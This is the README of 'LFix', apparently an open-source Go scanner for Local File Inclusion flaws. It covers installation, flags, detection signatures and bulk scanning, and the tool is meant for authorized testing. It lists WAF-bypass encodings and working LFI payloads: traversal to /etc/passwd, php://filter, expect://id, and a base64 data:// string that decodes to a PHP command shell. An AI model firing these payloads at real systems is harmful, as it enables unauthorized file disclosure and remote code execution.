@@ -1,0 +1,308 @@
+<p align="center">
+  <img src="https://img.shields.io/badge/Go-1.18+-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go Version"/>
+  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"/>
+  <img src="https://img.shields.io/badge/Platform-Linux%20|%20Windows%20|%20macOS-blue?style=for-the-badge" alt="Platform"/>
+  <img src="https://img.shields.io/badge/Version-1.0.0-red?style=for-the-badge" alt="Version"/>
+</p>
+
+<h1 align="center">🔥 LFix - Advanced LFI Vulnerability Scanner</h1>
+
+<p align="center">
+  <b>A blazing-fast, concurrent Local File Inclusion (LFI) vulnerability scanner with WAF bypass capabilities</b>
+</p>
+
+<p align="center">
+  <img src="https://user-images.githubusercontent.com/placeholder/lfix-demo.gif" alt="LFix Demo" width="700"/>
+</p>
+
+---
+
+## 🎯 Overview
+
+**LFix** is a powerful command-line security tool designed to detect Local File Inclusion (LFI) vulnerabilities in web applications. Built with Go for maximum performance, it features concurrent scanning, intelligent payload mutation for WAF bypass, and comprehensive signature-based detection.
+
+### ✨ Key Features
+
+| Feature | Description |
+|---------|-------------|
+| 🚀 **High Performance** | Concurrent scanning with configurable worker threads |
+| 🛡️ **WAF Bypass** | Intelligent payload mutation techniques (URL encoding, double encoding, null byte injection) |
+| 🎯 **Multi-Vector Injection** | URL parameters, POST data, and HTTP headers |
+| 🔍 **Smart Detection** | Signature-based analysis including Base64-encoded responses |
+| 🌐 **Proxy Support** | Route traffic through HTTP/SOCKS proxies |
+| 📝 **Flexible Input** | Single URL, file list, or stdin piping |
+| 🎭 **Stealth Mode** | Random User-Agent rotation with 30+ agents |
+| 📊 **Detailed Output** | Verbose logging and file export options |
+
+---
+
+## 📥 Installation
+
+### Option 1: Go Install (Recommended)
+
+```bash
+go install github.com/Serdar715/lfix@latest
+```
+
+### Option 2: Build from Source
+
+```bash
+# Clone the repository
+git clone https://github.com/Serdar715/lfix.git
+cd lfix
+
+# Build the binary
+go build -o lfix lfix.go
+
+# (Linux/macOS) Move to PATH
+sudo mv lfix /usr/local/bin/
+
+# (Windows) Add to PATH or use directly
+.\lfix.exe
+```
+
+### Option 3: Download Pre-built Binary
+
+Download the latest release from [Releases](https://github.com/Serdar715/lfix/releases) page.
+
+---
+
+## 🚀 Quick Start
+
+### Basic Usage
+
+```bash
+# Scan a single URL
+lfix -u "http://target.com/page.php?file=test"
+
+# Scan multiple URLs from file
+lfix -l urls.txt
+
+# Pipe URLs from stdin
+cat urls.txt | lfix
+
+# Using with custom payloads
+lfix -u "http://target.com/page.php?file=test" -p payloads.txt
+```
+
+### Advanced Examples
+
+```bash
+# POST request with data injection
+lfix -u "http://target.com/api" -X POST -data "filename=FUZZ"
+
+# Header injection testing
+lfix -u "http://target.com/" -H "X-File: FUZZ"
+
+# Multiple workers with proxy
+lfix -l urls.txt -c 50 -proxy "http://127.0.0.1:8080"
+
+# Save results to file
+lfix -u "http://target.com/page.php?file=test" -o results.txt
+
+# Verbose mode with debugging
+lfix -u "http://target.com/page.php?file=test" -v -debug
+```
+
+---
+
+## 📖 Usage Guide
+
+### Command Line Options
+
+| Flag | Description | Default |
+|------|-------------|---------|
+| `-u` | Single target URL | - |
+| `-l` | File containing list of URLs | - |
+| `-p` | Custom payload file | Built-in payloads |
+| `-o` | Output file for results | - |
+| `-X` | HTTP method (GET/POST) | `GET` |
+| `-data` | POST request body | - |
+| `-H` | Target header for injection | - |
+| `-header` | Static header to include | - |
+| `-proxy` | Proxy URL (HTTP/SOCKS) | - |
+| `-c` | Number of concurrent workers | `30` |
+| `-t` | Request timeout (seconds) | `7` |
+| `-v` | Verbose output | `false` |
+| `-debug` | Debug mode | `false` |
+| `-mutate` | Enable payload mutations | `true` |
+
+### Using FUZZ Keyword
+
+LFix supports the `FUZZ` keyword for precise injection point targeting:
+
+```bash
+# URL parameter fuzzing
+lfix -u "http://target.com/page.php?file=FUZZ"
+
+# POST body fuzzing
+lfix -u "http://target.com/api" -X POST -data "path=FUZZ&action=read"
+
+# Header value fuzzing
+lfix -u "http://target.com/" -H "X-Include-File: FUZZ"
+```
+
+---
+
+## 🔍 Detection Capabilities
+
+### Signature Categories
+
+LFix detects LFI vulnerabilities by analyzing response bodies for:
+
+#### 🐧 Linux/Unix Signatures
+- `/etc/passwd` content patterns (`root:x:0:0`, `daemon:x:`, `www-data:x:`)
+- Shell path references (`/bin/bash`, `/bin/sh`)
+- SSH key patterns (`ssh-rsa`)
+
+#### 💻 Windows Signatures
+- `win.ini` content patterns (`[boot loader]`, `[fonts]`)
+- System file references (`drivers\\etc\\hosts`)
+
+#### ⚠️ Application Error Patterns
+- PHP errors (`Warning: include(`, `failed to open stream`)
+- Java exceptions (`java.io.FileNotFoundException`)
+- Source code leakage (`<?php`)
+
+#### 🔐 Base64-Encoded Responses
+Automatically detects and decodes Base64 content in responses for hidden LFI indicators.
+
+---
+
+## 🛡️ WAF Bypass Techniques
+
+When mutation mode is enabled (`-mutate=true`), LFix automatically generates payload variations:
+
+| Technique | Example |
+|-----------|---------|
+| Original | `../../../etc/passwd` |
+| URL Encoding | `..%2F..%2F..%2Fetc%2Fpasswd` |
+| Double Encoding | `..%252F..%252F..%252Fetc%252Fpasswd` |
+| Null Byte Injection | `../../../etc/passwd%00` |
+| Path Filter Bypass | `....//....//....//etc/passwd` |
+
+---
+
+## 📂 Payload File Format
+
+Create custom payload files with one payload per line:
+
+```text
+../../../etc/passwd
+/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+....//....//....//etc/passwd
+../../../../windows/win.ini
+../../../../../../proc/self/environ
+php://input
+expect://id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+```
+
+---
+
+## 🤝 Integration Examples
+
+### With Other Tools
+
+```bash
+# Combine with waybackurls
+waybackurls target.com | grep "=" | lfix
+
+# Combine with gau
+gau target.com | grep "file=" | lfix
+
+# Combine with httpx
+cat domains.txt | httpx -paths /page.php?file=test | lfix
+
+# Use with Burp Suite proxy
+lfix -u "http://target.com/page.php?file=test" -proxy "http://127.0.0.1:8080"
+```
+
+### Automation Script
+
+```bash
+#!/bin/bash
+# bulk_lfi_scan.sh
+
+TARGET_FILE="$1"
+OUTPUT_DIR="results"
+
+mkdir -p "$OUTPUT_DIR"
+
+while read domain; do
+    echo "[*] Scanning: $domain"
+    lfix -u "$domain" -o "$OUTPUT_DIR/${domain//\//_}.txt" -c 20
+done < "$TARGET_FILE"
+```
+
+---
+
+## 📊 Sample Output
+
+```
+  ██╗     ███████╗██╗██╗  ██╗
+  ██║     ██╔════╝██║╚██╗██╔╝
+  ██║     █████╗  ██║ ╚███╔╝ 
+  ██║     ██╔══╝  ██║ ██╔██╗ 
+  ███████╗██║     ██║██╔╝ ██╗
+  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
+  lfix v1.0.0 - Advanced LFI Scanner
+
+[+] Mod: GET | Workers: 30 | Targets: 1 | Payloads: 5
+
+[VULN] [URL_file] Found: root:x:0:0
+    URL: http://target.com/page.php?file=../../../../etc/passwd
+    Payload: ../../../../etc/passwd
+
+[+] Tarama Tamamlandı.
+```
+
+---
+
+## ⚠️ Disclaimer
+
+This tool is intended for **authorized security testing and educational purposes only**. 
+
+- ✅ Only use on systems you have explicit permission to test
+- ✅ Follow responsible disclosure practices
+- ❌ Do not use for malicious purposes
+- ❌ Do not test systems without proper authorization
+
+The developers assume no liability for misuse of this software.
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+---
+
+## 📜 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+## 🌟 Star History
+
+If you find this tool useful, please consider giving it a ⭐!
+
+---
+
+<p align="center">
+  <b>Made with ❤️ for the Security Community</b>
+</p>
+
+<p align="center">
+  <a href="https://github.com/yourusername/lfix/issues">Report Bug</a>
+  ·
+  <a href="https://github.com/yourusername/lfix/issues">Request Feature</a>
+</p>
